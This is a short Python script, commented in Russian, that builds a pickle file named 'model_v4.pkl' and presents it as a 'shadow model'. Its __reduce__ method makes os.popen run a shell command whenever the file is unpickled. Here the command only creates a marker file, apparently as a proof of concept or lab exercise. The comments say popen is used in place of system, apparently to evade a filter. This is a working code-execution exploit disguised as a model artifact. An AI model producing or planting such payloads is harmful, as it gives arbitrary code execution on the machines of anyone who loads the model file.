import pickle
import os

class ShadowModel:
    def __reduce__(self):
        # Используем popen вместо system. 
        # popen открывает поток к команде, что тоже приводит к её выполнению.
        return (os.popen, ('touch /app/V4_SUCCESS.txt',))

with open('model_v4.pkl', 'wb') as f:
    pickle.dump(ShadowModel(), f)

print("Теневая модель 'model_v4.pkl' создана!")
